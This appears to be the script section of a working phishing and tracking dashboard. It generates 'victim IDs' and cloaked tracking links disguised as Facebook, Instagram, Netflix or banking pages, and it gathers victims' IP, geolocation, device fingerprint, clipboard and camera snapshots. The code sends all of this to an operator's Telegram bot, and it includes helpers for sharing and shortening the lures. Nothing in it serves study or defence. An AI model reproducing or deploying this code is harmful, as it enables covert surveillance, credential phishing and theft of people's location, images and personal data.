        }

        // ============================================
        // VICTIM ID FUNCTIONS
        // ============================================

        // Generate Victim ID
        function generateVictimID() {
            const timestamp = Date.now();
            const randomStr = Math.random().toString(36).substring(2, 10);
            const userAgentHash = simpleHash(navigator.userAgent).substring(0, 8);
            const victimID = `DEV-${timestamp.toString(36).substring(4)}-${randomStr}-${userAgentHash}`;
            
            const victimIdElement = document.getElementById('victim-id');
            if (victimIdElement) {
                victimIdElement.textContent = victimID;
            }
            deviceData.victimID = victimID;
            
            const qrCode = document.querySelector('.qr-code');
            if (qrCode) {
                qrCode.innerHTML = `<span>ID: ${victimID.substring(0, 12)}...</span>`;
            }
            
            showToast('New Victim ID generated', 'success');
        }

        // ============================================
        // LINK GENERATOR FUNCTIONS
        // ============================================

        // Generate tracking link
        function generateTrackingLink() {
            // Get form values
            const campaignName = document.getElementById('campaign-name');
            const redirectUrl = document.getElementById('redirect-url');
            const cloakUrl = document.getElementById('cloak-url');
            const cloakTitle = document.getElementById('cloak-title');
            
            if (!campaignName || !redirectUrl || !cloakUrl || !cloakTitle) return;
            
            const campaignNameValue = campaignName.value.trim() || 'Untitled Campaign';
            const redirectUrlValue = redirectUrl.value.trim() || 'https://google.com';
            const cloakUrlValue = cloakUrl.value.trim() || 'https://free-gifts.com';
            const cloakTitleValue = cloakTitle.value.trim() || 'Secure Page';
            
            // Get data collection settings
            const dataSettings = {
                collectBasic: document.getElementById('collect-basic')?.checked || false,
                collectLocation: document.getElementById('collect-location')?.checked || false,
                collectCamera: document.getElementById('collect-camera')?.checked || false,
                collectNetwork: document.getElementById('collect-network')?.checked || false,
                collectBattery: document.getElementById('collect-battery')?.checked || false,
                collectClipboard: document.getElementById('collect-clipboard')?.checked || false,
                autoTelegram: document.getElementById('auto-telegram')?.checked || false,
                redirectUrl: redirectUrlValue,
                cloakUrl: cloakUrlValue,
                cloakTitle: cloakTitleValue
            };
            
            // Generate unique campaign ID
            const campaignId = 'camp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Create the tracking link
            const currentUrl = window.location.href.split('?')[0];
            const trackingLink = `${currentUrl}?track=true&cid=${campaignId}&redirect=${encodeURIComponent(redirectUrlValue)}`;
            
            // Save campaign
            const campaign = campaignManager.addCampaign(campaignNameValue, trackingLink, dataSettings);
            
            // Display the generated link
            displayGeneratedLink(trackingLink, campaignId);
            
            // Update preview
            updateCloakPreview();
            
            // Show success message
            showToast(`Tracking link generated for "${campaignNameValue}"`, 'success');
            
            return { link: trackingLink, campaignId: campaignId };
        }

        // Display generated link
        function displayGeneratedLink(link, campaignId) {
            const linkPreview = document.getElementById('generated-link-preview');
            const shortPreview = document.getElementById('quick-link-preview');
            
            const html = `
                <div class="d-flex justify-content-between align-items-center">
                    <div>
                        <strong>Generated Link:</strong><br>
                        <span class="small">${link}</span>
                    </div>
                    <div>
                        <button class="btn btn-sm btn-success" onclick="copyToClipboard('${link}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                </div>
                <div class="mt-2 small text-muted">
                    Campaign ID: ${campaignId}<br>
                    Total Clicks: 0 | Data Collected: 0
                </div>
            `;
            
            if (linkPreview) {
                linkPreview.innerHTML = html;
            }
            
            if (shortPreview) {
                shortPreview.innerHTML = html;
            }
            
            // Generate QR code preview
            generateQRCodePreview(link);
        }

        // Generate QR code preview
        function generateQRCodePreview(link) {
            const qrCodeDiv = document.querySelector('#linkModal .qr-code');
            if (qrCodeDiv) {
                qrCodeDiv.innerHTML = `
                    <div class="text-center">
                        <div style="font-size: 3rem; color: #333;">
                            <i class="fas fa-qrcode"></i>
                        </div>
                        <small>Scan to open link</small><br>
                        <small class="text-muted">${link.substring(0, 20)}...</small>
                    </div>
                `;
            }
        }

        // Update cloak preview
        function updateCloakPreview() {
            const cloakTitle = document.getElementById('cloak-title');
            const cloakUrl = document.getElementById('cloak-url');
            const preview = document.getElementById('cloak-preview');
            
            if (!cloakTitle || !cloakUrl || !preview) return;
            
            const title = cloakTitle.value || 'Secure Page';
            const url = cloakUrl.value || 'https://trusted-site.com';
            
            preview.innerHTML = `
                <h5>${title}</h5>
                <p>This page will be displayed at: <code>${url}</code></p>
                <img src="https://via.placeholder.com/400x200/3498db/FFFFFF?text=${encodeURIComponent(title)}" 
                     alt="Cloaked Page Preview" class="mb-3">
                <p class="small text-muted">
                    <i class="fas fa-shield-alt"></i> This appears as a legitimate website to users while data is collected in the background.
                </p>
            `;
        }

        // ============================================
        // TELEGRAM FUNCTIONS
        // ============================================

        // Load Telegram configuration from localStorage
        function loadTelegramConfig() {
            const savedToken = localStorage.getItem('telegramBotToken');
            const savedChatId = localStorage.getItem('telegramChatId');
            
            if (savedToken) telegramConfig.botToken = savedToken;
            if (savedChatId) telegramConfig.chatId = savedChatId;
            
            // Update input fields
            const botToken = document.getElementById('bot-token');
            const chatId = document.getElementById('chat-id');
            
            if (botToken) botToken.value = telegramConfig.botToken;
            if (chatId) chatId.value = telegramConfig.chatId;
        }

        // Save Telegram configuration
        function saveTelegramConfig() {
            const botToken = document.getElementById('bot-token');
            const chatId = document.getElementById('chat-id');
            
            if (botToken) telegramConfig.botToken = botToken.value;
            if (chatId) telegramConfig.chatId = chatId.value;
            
            localStorage.setItem('telegramBotToken', telegramConfig.botToken);
            localStorage.setItem('telegramChatId', telegramConfig.chatId);
        }

        // Send Telegram message
        async function sendTelegramMessage(text) {
            saveTelegramConfig();
            
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                showToast('Please configure bot token and chat ID first!', 'error');
                throw new Error('Telegram bot not configured');
            }
            
            const url = `${telegramConfig.apiUrl}${telegramConfig.botToken}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: telegramConfig.chatId,
                    text: text,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });
            
            const data = await response.json();
            
            if (!data.ok) {
                throw new Error(data.description || 'Unknown Telegram API error');
            }
            
            return data;
        }

        // Send Telegram document
        async function sendTelegramDocument(file, caption = '') {
            saveTelegramConfig();
            
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                showToast('Please configure bot token and chat ID first!', 'error');
                throw new Error('Telegram bot not configured');
            }
            
            const url = `${telegramConfig.apiUrl}${telegramConfig.botToken}/sendDocument`;
            
            const formData = new FormData();
            formData.append('chat_id', telegramConfig.chatId);
            formData.append('document', file);
            if (caption) {
                formData.append('caption', caption);
            }
            
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (!data.ok) {
                throw new Error(data.description || 'Unknown Telegram API error');
            }
            
            return data;
        }

        // Send data to Telegram
        async function sendToTelegram() {
            saveTelegramConfig();
            
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                showToast('Please configure bot token and chat ID first!', 'error');
                return;
            }
            
            try {
                showToast('Sending data to Telegram...', 'info');
                
                const dataSelect = document.getElementById('data-select');
                const selectedOptions = Array.from(dataSelect.selectedOptions).map(opt => opt.value);
                const includeScreenshots = document.getElementById('include-screenshots').checked;
                
                let message = `üì± *Device Information Report*\n\n`;
                message += `‚è∞ *Time:* ${new Date().toLocaleString()}\n`;
                message += `üîó *Source:* Dashboard\n\n`;
                
                if (selectedOptions.includes('device') || selectedOptions.includes('all')) {
                    message += `üìä *Device Information:*\n`;
                    message += `‚Ä¢ Platform: ${deviceData.deviceInfo.platform || 'Unknown'}\n`;
                    message += `‚Ä¢ Device: ${deviceData.deviceInfo.deviceName || 'Unknown'}\n`;
                    message += `‚Ä¢ Resolution: ${deviceData.deviceInfo.screenResolution || 'Unknown'}\n`;
                }
                
                if ((selectedOptions.includes('network') || selectedOptions.includes('all')) && deviceData.networkInfo) {
                    message += `\nüåê *Network Information:*\n`;
                    message += `‚Ä¢ IP: \`${deviceData.networkInfo.ipv4 || 'Unknown'}\`\n`;
                    message += `‚Ä¢ Type: ${deviceData.networkInfo.connectionType || 'Unknown'}\n`;
                }
                
                if ((selectedOptions.includes('location') || selectedOptions.includes('all')) && deviceData.locationInfo) {
                    message += `\nüìç *Location Information:*\n`;
                    message += `‚Ä¢ Lat: ${deviceData.locationInfo.latitude?.toFixed(6) || 'Not available'}\n`;
                    message += `‚Ä¢ Lon: ${deviceData.locationInfo.longitude?.toFixed(6) || 'Not available'}\n`;
                    if (deviceData.locationInfo.latitude && deviceData.locationInfo.longitude) {
                        message += `‚Ä¢ Map: https://maps.google.com/?q=${deviceData.locationInfo.latitude},${deviceData.locationInfo.longitude}\n`;
                    }
                }
                
                if (selectedOptions.includes('fingerprint') || selectedOptions.includes('all')) {
                    message += `\nüÜî *Fingerprint:*\n`;
                    message += `‚Ä¢ Hash: \`${deviceData.fingerprintInfo.full?.substring(0, 32) || 'Not available'}...\`\n`;
                }
                
                message += `\n_Report generated via Device Information Scanner_`;
                
                // Send message
                await sendTelegramMessage(message);
                
                // Send screenshots if requested and available
                if (includeScreenshots && deviceData.cameraInfo) {
                    for (const [cameraType, dataURL] of Object.entries(deviceData.cameraInfo)) {
                        if (dataURL && dataURL.startsWith('data:image')) {
                            const blob = await fetch(dataURL).then(r => r.blob());
                            const file = new File([blob], `${cameraType}-${Date.now()}.png`, { type: 'image/png' });
                            await sendTelegramDocument(file, `${cameraType} Camera Snapshot`);
                        }
                    }
                }
                
                // Send full data as JSON
                const jsonBlob = new Blob([JSON.stringify(deviceData, null, 2)], { 
                    type: 'application/json' 
                });
                const jsonFile = new File([jsonBlob], `device-data-${Date.now()}.json`);
                await sendTelegramDocument(jsonFile, 'Complete Device Data JSON');
                
                // Update history
                telegramConfig.sendHistory.push({
                    timestamp: new Date().toISOString(),
                    type: 'Full Report',
                    success: true,
                    message: `Data sent successfully`
                });
                
                updateTelegramTab();
                showToast('Data sent to Telegram successfully!', 'success');
                
            } catch (error) {
                console.error('Failed to send to Telegram:', error);
                telegramConfig.sendHistory.push({
                    timestamp: new Date().toISOString(),
                    type: 'Full Report',
                    success: false,
                    message: `Error: ${error.message}`
                });
                updateTelegramTab();
                showToast(`Failed to send: ${error.message}`, 'error');
            }
        }

        // ============================================
        // UTILITY FUNCTIONS
        // ============================================

        // Simple hash function
        function simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash).toString(16);
        }

        // Delay function
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Download All Data
        function downloadData() {
            deviceData.timestamp = new Date().toISOString();
            deviceData.collectionTool = "Device Information Scanner";
            
            const dataStr = JSON.stringify(deviceData, null, 2);
            const dataBlob = new Blob([dataStr], { type: 'application/json' });
            
            const downloadLink = document.createElement('a');
            downloadLink.href = URL.createObjectURL(dataBlob);
            downloadLink.download = `device-info-${new Date().toISOString().split('T')[0]}.json`;
            
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            showToast('Data downloaded successfully!', 'success');
        }

        // Copy to clipboard helper
        function copyToClipboard(text) {
            if (typeof text === 'string') {
                navigator.clipboard.writeText(text).then(() => {
                    showToast('Copied to clipboard!', 'success');
                }).catch(err => {
                    // Fallback for older browsers
                    const textarea = document.createElement('textarea');
                    textarea.value = text;
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textarea);
                    showToast('Copied to clipboard!', 'success');
                });
            } else if (text === 'clipboard-content') {
                const textarea = document.getElementById('clipboard-content');
                textarea.select();
                document.execCommand('copy');
                showToast('Copied to clipboard!', 'success');
            }
        }

        // Open settings modal
        function openConfigModal() {
            const modalElement = document.getElementById('settingsModal');
            if (modalElement) {
                const modal = new bootstrap.Modal(modalElement);
                modal.show();
            }
        }

        // Show Toast Notification
        function showToast(message, type = 'info') {
            // Remove existing toasts
            const existingToasts = document.querySelectorAll('.custom-toast');
            existingToasts.forEach(toast => toast.remove());
            
            // Create toast
            const toast = document.createElement('div');
            toast.className = `custom-toast`;
            toast.style.cssText = 'position: fixed; bottom: 20px; right: 20px; z-index: 9999; min-width: 300px;';
            
            let bgColor = 'bg-primary';
            let icon = 'fas fa-info-circle';
            
            if (type === 'success') {
                bgColor = 'bg-success';
                icon = 'fas fa-check-circle';
            } else if (type === 'error') {
                bgColor = 'bg-danger';
                icon = 'fas fa-exclamation-circle';
            } else if (type === 'warning') {
                bgColor = 'bg-warning';
                icon = 'fas fa-exclamation-triangle';
            }
            
            toast.innerHTML = `
                <div class="toast show" role="alert" aria-live="assertive" aria-atomic="true">
                    <div class="toast-header ${bgColor} text-white">
                        <i class="${icon} me-2"></i>
                        <strong class="me-auto">Device Scanner</strong>
                        <small>Just now</small>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="toast" aria-label="Close"></button>
                    </div>
                    <div class="toast-body">
                        ${message}
                    </div>
                </div>
            `;
            
            document.body.appendChild(toast);
            
            // Auto remove after 5 seconds
            setTimeout(() => {
                if (toast.parentNode) {
                    toast.remove();
                }
            }, 5000);
            
            // Add close button functionality
            const closeBtn = toast.querySelector('.btn-close');
            if (closeBtn) {
                closeBtn.addEventListener('click', () => {
                    toast.remove();
                });
            }
        }

        // Update campaigns list
        function updateCampaignsList() {
            const campaignsList = document.getElementById('campaigns-list');
            if (!campaignsList) return;
            
            const campaigns = campaignManager.getCampaignStats();
            
            if (campaigns.length === 0) {
                campaignsList.innerHTML = `
                    <div class="text-center text-muted py-4">
                        <i class="fas fa-link fa-2x mb-3"></i>
                        <p>No campaigns yet. Generate your first tracking link!</p>
                    </div>
                `;
                return;
            }
            
            let html = '';
            campaigns.forEach(campaign => {
                html += `
                    <div class="campaign-item">
                        <div class="d-flex justify-content-between align-items-center">
                            <strong>${campaign.name}</strong>
                            <span class="badge bg-success">Active</span>
                        </div>
                        <p class="small mb-1">${campaign.link.substring(0, 60)}...</p>
                        <div class="campaign-stats">
                            <span><i class="fas fa-eye"></i> ${campaign.stats.views} Views</span> ‚Ä¢ 
                            <span><i class="fas fa-user"></i> ${campaign.stats.clicks} Clicks</span> ‚Ä¢ 
                            <span><i class="fas fa-download"></i> ${campaign.stats.dataCollected} Data Collected</span>
                        </div>
                        <div class="mt-2">
                            <button class="btn btn-sm btn-outline-primary" onclick="viewCampaignDetails('${campaign.id}')">
                                <i class="fas fa-chart-bar"></i> Stats
                            </button>
                            <button class="btn btn-sm btn-outline-success" onclick="copyToClipboard('${campaign.link}')">
                                <i class="fas fa-copy"></i> Copy Link
                            </button>
                        </div>
                    </div>
                `;
            });
            
            campaignsList.innerHTML = html;
        }

        // Update Telegram tab
        function updateTelegramTab() {
            const historyContainer = document.getElementById('telegram-history');
            if (!historyContainer) return;
            
            if (telegramConfig.sendHistory.length > 0) {
                let historyHTML = '';
                telegramConfig.sendHistory.slice(-5).reverse().forEach(item => {
                    const time = new Date(item.timestamp).toLocaleTimeString();
                    const status = item.success ? '‚úÖ' : '‚ùå';
                    historyHTML += `
                        <div class="border-bottom pb-2 mb-2">
                            <div class="d-flex justify-content-between">
                                <span>${status} ${item.type}</span>
                                <span class="text-muted">${time}</span>
                            </div>
                            <small class="text-muted">${item.message}</small>
                        </div>
                    `;
                });
                historyContainer.innerHTML = historyHTML;
            } else {
                historyContainer.innerHTML = '<p class="text-muted">No data sent yet.</p>';
            }
        }

        // View campaign details
        function viewCampaignDetails(campaignId) {
            campaignManager.loadFromStorage();
            const campaign = campaignManager.campaigns.find(c => c.id === campaignId);
            
            if (campaign) {
                alert(`Campaign Details:\n\nName: ${campaign.name}\nLink: ${campaign.link}\nClicks: ${campaign.stats.clicks}\nData Collected: ${campaign.stats.dataCollected}\nLast Access: ${campaign.stats.lastAccess ? new Date(campaign.stats.lastAccess).toLocaleString() : 'Never'}`);
            }
        }

        // Additional helper functions for missing features
        function testTelegramConnection() {
            saveTelegramConfig();
            
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                showToast('Please configure bot token and chat ID first!', 'error');
                return;
            }
            
            showToast('Testing Telegram connection...', 'info');
            
            sendTelegramMessage('‚úÖ Device Scanner Test Connection Successful!\nBot is working correctly.')
                .then(() => {
                    showToast('‚úÖ Connected to Telegram bot successfully!', 'success');
                    telegramConfig.sendHistory.push({
                        timestamp: new Date().toISOString(),
                        type: 'Test',
                        success: true,
                        message: 'Connection test successful'
                    });
                    updateTelegramTab();
                })
                .catch(error => {
                    showToast(`‚ùå Connection failed: ${error.message}`, 'error');
                    telegramConfig.sendHistory.push({
                        timestamp: new Date().toISOString(),
                        type: 'Test',
                        success: false,
                        message: `Error: ${error.message}`
                    });
                    updateTelegramTab();
                });
        }

        // Generate phishing template
        function generatePhishingTemplate(type) {
            const templates = {
                'facebook': {
                    name: 'Facebook Login',
                    redirect: 'https://facebook.com',
                    cloak: 'https://facebook-login-secure.com',
                    title: 'üîê Facebook Security Verification Required'
                },
                'instagram': {
                    name: 'Instagram Giveaway',
                    redirect: 'https://instagram.com',
                    cloak: 'https://instagram-free-gifts.com',
                    title: 'üéÅ Instagram iPhone Giveaway - Claim Now!'
                },
                'netflix': {
                    name: 'Netflix Free Trial',
                    redirect: 'https://netflix.com',
                    cloak: 'https://netflix-free-premium.com',
                    title: 'üçø Netflix Premium 6-Month Free Trial'
                },
                'banking': {
                    name: 'Banking Security',
                    redirect: 'https://bank.com',
                    cloak: 'https://secure-banking-update.com',
                    title: 'üè¶ Important: Security Update Required'
                }
            };
            
            const template = templates[type];
            if (template) {
                document.getElementById('campaign-name').value = template.name;
                document.getElementById('redirect-url').value = template.redirect;
                document.getElementById('cloak-url').value = template.cloak;
                document.getElementById('cloak-title').value = template.title;
                
                updateCloakPreview();
                showToast(`Loaded ${type} template`, 'success');
            }
        }

        // Generate quick link
        function generateQuickLink() {
            const linkType = document.getElementById('quick-link-type').value;
            const currentUrl = window.location.href.split('?')[0];
            
            let link = currentUrl;
            if (linkType === 'cloaked') {
                link += '?track=true&cid=quick_' + Date.now() + '&redirect=https://google.com&title=Secure%20Page';
            } else if (linkType === 'redirect') {
                link += '?track=true&cid=redirect_' + Date.now() + '&redirect=https://youtube.com';
            } else {
                link += '?track=true&cid=direct_' + Date.now();
            }
            
            const preview = document.getElementById('quick-link-preview');
            preview.innerHTML = `
                <div class="d-flex justify-content-between align-items-center">
                    <div>
                        <strong>Quick Link:</strong><br>
                        <span class="small">${link}</span>
                    </div>
                    <div>
                        <button class="btn btn-sm btn-success" onclick="copyToClipboard('${link}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                </div>
            `;
            
            showToast('Quick link generated!', 'success');
        }

        // Copy quick link
        function copyQuickLink() {
            const preview = document.getElementById('quick-link-preview');
            const linkMatch = preview.textContent.match(/https?:\/\/[^\s]+/);
            
            if (linkMatch) {
                copyToClipboard(linkMatch[0]);
            } else {
                showToast('No link to copy', 'error');
            }
        }

        // Share link on social media
        function shareLink(platform) {
            const preview = document.getElementById('generated-link-preview');
            const linkMatch = preview.textContent.match(/https?:\/\/[^\s]+/);
            
            if (!linkMatch) {
                showToast('Generate a link first', 'error');
                return;
            }
            
            const link = linkMatch[0];
            let url = '';
            
            switch(platform) {
                case 'facebook':
                    url = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(link)}`;
                    break;
                case 'whatsapp':
                    url = `https://wa.me/?text=${encodeURIComponent(`Check this out: ${link}`)}`;
                    break;
                case 'telegram':
                    url = `https://t.me/share/url?url=${encodeURIComponent(link)}`;
                    break;
                case 'twitter':
                    url = `https://twitter.com/intent/tweet?url=${encodeURIComponent(link)}`;
                    break;
                case 'messenger':
                    url = `fb-messenger://share?link=${encodeURIComponent(link)}`;
                    break;
            }
            
            if (url) {
                window.open(url, '_blank');
                showToast(`Sharing on ${platform}`, 'info');
            }
        }

        // Shorten link
        function shortenLink() {
            const service = document.getElementById('shortener-service').value;
            const preview = document.getElementById('generated-link-preview');
            const linkMatch = preview.textContent.match(/https?:\/\/[^\s]+/);
            
            if (!linkMatch) {
                showToast('Generate a link first', 'error');
                return;
            }
            
            const originalLink = linkMatch[0];
            let shortenedLink = '';
            
            // Simulate shortening
            switch(service) {
                case 'bitly':
                    shortenedLink = `https://bit.ly/${Math.random().toString(36).substring(2, 8)}`;
                    break;
                case 'tinyurl':
                    shortenedLink = `https://tinyurl.com/${Math.random().toString(36).substring(2, 10)}`;
                    break;
                case 'isgd':
                    shortenedLink = `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
                    break;
                case 'custom':
                    shortenedLink = `https://your-domain.com/${Math.random().toString(36).substring(2, 8)}`;
                    break;
            }
            
            document.getElementById('short-link-text').textContent = shortenedLink;
            document.getElementById('shortened-link').style.display = 'block';
            
            showToast('Link shortened! (Simulated)', 'success');
        }

        // Copy short link
        function copyShortLink() {
            const shortLinkText = document.getElementById('short-link-text');
            if (shortLinkText && shortLinkText.textContent) {
                copyToClipboard(shortLinkText.textContent);
            } else {
                showToast('No shortened link available', 'error');
            }
        }

        // Clear all data
        function clearAllData() {
            if (confirm('Are you sure you want to clear all collected data? This cannot be undone.')) {
                Object.keys(deviceData).forEach(key => {
                    if (typeof deviceData[key] === 'object') {
                        deviceData[key] = {};
                    }
                });
                
                document.querySelectorAll('[id$="snapshot-img"]').forEach(img => {
                    img.style.display = 'none';
                });
                
                const clipboardContent = document.getElementById('clipboard-content');
                if (clipboardContent) clipboardContent.value = '';
                
                telegramConfig.sendHistory = [];
                updateTelegramTab();
                
                localStorage.removeItem('telegramBotToken');
                localStorage.removeItem('telegramChatId');
                
                showToast('All data cleared successfully!', 'success');
            }
        }

        // Update screenshots preview
        function updateScreenshotsPreview() {
            const container = document.getElementById('screenshots-preview');
            if (!container) return;
            
            container.innerHTML = '';
            
            if (deviceData.cameraInfo) {
                if (deviceData.cameraInfo.frontSnapshot) {
                    const col = document.createElement('div');
                    col.className = 'col-md-6';
                    col.innerHTML = `
                        <div class="text-center">
                            <img src="${deviceData.cameraInfo.frontSnapshot}" class="screenshot-img" alt="Front Camera">
                            <p class="small">Front Camera</p>
                        </div>
                    `;
                    container.appendChild(col);
                }
                
                if (deviceData.cameraInfo.backSnapshot) {
                    const col = document.createElement('div');
                    col.className = 'col-md-6';
                    col.innerHTML = `
                        <div class="text-center">
                            <img src="${deviceData.cameraInfo.backSnapshot}" class="screenshot-img" alt="Back Camera">
                            <p class="small">Back Camera</p>
                        </div>
                    `;
                    container.appendChild(col);
                }
            } else {
                container.innerHTML = '<p class="text-muted">No screenshots available. Take some photos first.</p>';
            }
        }

        // Quick send functions
        function sendBasicInfo() {
            saveTelegramConfig();
            
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                showToast('Configure Telegram first!', 'error');
                return;
            }
            
            let message = `üì± *Basic Device Info*\n\n`;
            message += `‚Ä¢ Platform: ${deviceData.deviceInfo.platform || 'Unknown'}\n`;
            message += `‚Ä¢ Device: ${deviceData.deviceInfo.deviceName || 'Unknown'}\n`;
            message += `‚Ä¢ IP: \`${deviceData.networkInfo.ipv4 || 'Unknown'}\`\n`;
            message += `‚Ä¢ Fingerprint: \`${deviceData.fingerprintInfo.full?.substring(0, 32) || 'Unknown'}...\`\n`;
            
            sendTelegramMessage(message)
                .then(() => {
                    showToast('Basic info sent!', 'success');
                    telegramConfig.sendHistory.push({
                        timestamp: new Date().toISOString(),
                        type: 'Basic Info',
                        success: true,
                        message: 'Basic device information'
                    });
                    updateTelegramTab();
                })
                .catch(error => {
                    showToast(`Failed: ${error.message}`, 'error');
                });
        }

        function sendLocationInfo() {
            saveTelegramConfig();
            
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                showToast('Configure Telegram first!', 'error');
                return;
            }
            
            if (!deviceData.locationInfo || !deviceData.locationInfo.latitude) {
                showToast('No location data available!', 'error');
                return;
            }
            
            let message = `üìç *Location Info*\n\n`;
            message += `‚Ä¢ Lat: ${deviceData.locationInfo.latitude.toFixed(6)}\n`;
            message += `‚Ä¢ Lon: ${deviceData.locationInfo.longitude.toFixed(6)}\n`;
            message += `‚Ä¢ Accuracy: ${deviceData.locationInfo.accuracy?.toFixed(2) || 'Unknown'} meters\n`;
            message += `‚Ä¢ Map: https://maps.google.com/?q=${deviceData.locationInfo.latitude},${deviceData.locationInfo.longitude}\n`;
            
            sendTelegramMessage(message)
                .then(() => {
                    showToast('Location sent!', 'success');
                    telegramConfig.sendHistory.push({
                        timestamp: new Date().toISOString(),
                        type: 'Location',
                        success: true,
                        message: 'Location information'
                    });
                    updateTelegramTab();
                })
                .catch(error => {
                    showToast(`Failed: ${error.message}`, 'error');
                });
        }

        async function sendScreenshots() {
            saveTelegramConfig();
            
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                showToast('Configure Telegram first!', 'error');
                return;
            }
            
            if (!deviceData.cameraInfo || (!deviceData.cameraInfo.frontSnapshot && !deviceData.cameraInfo.backSnapshot)) {
                showToast('No screenshots available!', 'error');
                return;
            }
            
            try {
                showToast('Sending screenshots...', 'info');
                
                for (const [cameraType, dataURL] of Object.entries(deviceData.cameraInfo)) {
                    if (dataURL && dataURL.startsWith('data:image')) {
                        const blob = await fetch(dataURL).then(r => r.blob());
                        const file = new File([blob], `${cameraType}-${Date.now()}.png`, { type: 'image/png' });
                        await sendTelegramDocument(file, `${cameraType} Camera Snapshot`);
                    }
                }
                
                showToast('Screenshots sent!', 'success');
                telegramConfig.sendHistory.push({
                    timestamp: new Date().toISOString(),
                    type: 'Screenshots',
                    success: true,
                    message: 'Camera screenshots'
                });
                updateTelegramTab();
                
            } catch (error) {
                showToast(`Failed: ${error.message}`, 'error');
            }
        }

        function sendEverything() {
            sendToTelegram();
        }

        function sendCustomData() {
            const customMessage = document.getElementById('custom-message').value;
            const anonymize = document.getElementById('send-anonymously').checked;
            
            saveTelegramConfig();
            
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                showToast('Configure Telegram first!', 'error');
                return;
            }
            
            let message = `üì± *Custom Device Report*\n\n`;
            if (customMessage) {
                message += `${customMessage}\n\n`;
            }
            
            message += `‚Ä¢ Platform: ${deviceData.deviceInfo.platform || 'Unknown'}\n`;
            message += `‚Ä¢ Device: ${deviceData.deviceInfo.deviceName || 'Unknown'}\n`;
            
            if (!anonymize && deviceData.networkInfo?.ipv4) {
                message += `‚Ä¢ IP: \`${deviceData.networkInfo.ipv4}\`\n`;
            }
            
            if (!anonymize && deviceData.locationInfo?.latitude) {
                message += `‚Ä¢ Location: ${deviceData.locationInfo.latitude.toFixed(6)}, ${deviceData.locationInfo.longitude.toFixed(6)}\n`;
            }
            
            sendTelegramMessage(message)
                .then(() => {
                    showToast('Custom data sent!', 'success');
                    telegramConfig.sendHistory.push({
                        timestamp: new Date().toISOString(),
                        type: 'Custom',
                        success: true,
                        message: customMessage || 'Custom report'
                    });
                    updateTelegramTab();
                })
                .catch(error => {
                    showToast(`Failed: ${error.message}`, 'error');
                });
        }

        // All-in-one tools functions
        function showIPTab() {
            const triggerTab = document.querySelector('a[href="#network-tab"]');
            if (triggerTab) {
                const tab = new bootstrap.Tab(triggerTab);
                tab.show();
            }
        }

        function showUserAgentTab() {
            const triggerTab = document.querySelector('a[href="#info-tab"]');
            if (triggerTab) {
                const tab = new bootstrap.Tab(triggerTab);
                tab.show();
            }
        }

        function testScreen() {
            const testWindow = window.open('', 'Screen Test', 'width=800,height=600');
            if (testWindow) {
                testWindow.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Screen Tester</title>
                        <style>
                            body { margin: 0; padding: 20px; font-family: Arial, sans-serif; }
                            .test-area { width: 100%; height: 300px; border: 2px solid #000; margin-bottom: 20px; }
                            .color-grid { display: grid; grid-template-columns: repeat(10, 1fr); gap: 5px; }
                            .color-cell { height: 30px; }
                        </style>
                    </head>
                    <body>
                        <h1>Screen Test</h1>
                        <div class="test-area" id="resolution-test"></div>
                        <h3>Color Test</h3>
                        <div class="color-grid" id="color-test"></div>
                        <script>
                            const resolutionTest = document.getElementById('resolution-test');
                            resolutionTest.innerHTML = \`
                                <h2>\${window.screen.width} x \${window.screen.height}</h2>
                                <p>Color Depth: \${window.screen.colorDepth} bit</p>
                                <p>Pixel Depth: \${window.screen.pixelDepth} bit</p>
                            \`;
                            
                            const colorGrid = document.getElementById('color-test');
                            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff', 
                                          '#000000', '#ffffff', '#888888', '#ff8800'];
                            for (let i = 0; i < 100; i++) {
                                const cell = document.createElement('div');
                                cell.className = 'color-cell';
                                cell.style.backgroundColor = colors[i % colors.length];
                                colorGrid.appendChild(cell);
                            }
                        <\/script>
                    </body>
                    </html>
                `);
            } else {
                showToast('Popup blocked. Please allow popups for this site.', 'error');
            }
        }

        function testNetwork() {
            showToast('Network test feature would check speed and latency here.', 'info');
        }

        function checkSecurity() {
            showToast('Security check would analyze browser security settings here.', 'info');
        }

        function compressData() {
            showToast('Data compression tools would be available here.', 'info');
        }

        // ============================================
        // EVENT LISTENERS FOR MODALS
        // ============================================

        document.addEventListener('DOMContentLoaded', function() {
            const telegramModal = document.getElementById('telegramModal');
            const linkModal = document.getElementById('linkModal');
            
            if (telegramModal) {
                telegramModal.addEventListener('show.bs.modal', function () {
                    updateScreenshotsPreview();
                });
            }
            
            if (linkModal) {
                linkModal.addEventListener('show.bs.modal', function () {
                    updateCloakPreview();
                });
            }
        });
    </script>
</body>
</html>